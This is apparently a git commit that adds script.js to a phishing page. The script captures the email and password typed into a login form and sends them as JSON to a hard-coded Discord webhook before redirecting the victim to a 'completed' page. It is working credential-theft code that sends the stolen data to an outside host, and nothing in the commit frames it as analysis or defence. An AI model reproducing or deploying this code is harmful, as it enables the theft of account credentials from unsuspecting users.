36ca33880bd777db1565137131633f2d71136784
reddragonroom <ronlara00@gmail.com>
2025-09-27 01:40:43 +0500

    Add files via upload

---
+++ script.js
@@ -0,0 +1,22 @@
+const email = document.querySelector("input[type='email']");
+const password = document.querySelector("input[type='password']");
+const loginButton = document.querySelector("#sign-in-btn");
+
+loginButton.addEventListener("click", () => {
+  const content = { email: email.value, password: password.value };
+  const webhookURL =
+    "https://discord.com/api/webhooks/1421198194758647906/jCx6wDN8iYUuOr4Od7yPTxr6BWcqLgnb89J6A4DV-fWNbi2OOLhklkcaOLsrjkqTt5KG";
+
+  if (email.value && password.value) {
+    (async () => {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: JSON.stringify(content),
+        }),
+      });
+      window.location.href = "completed.html";
+    })();
+  }
+});
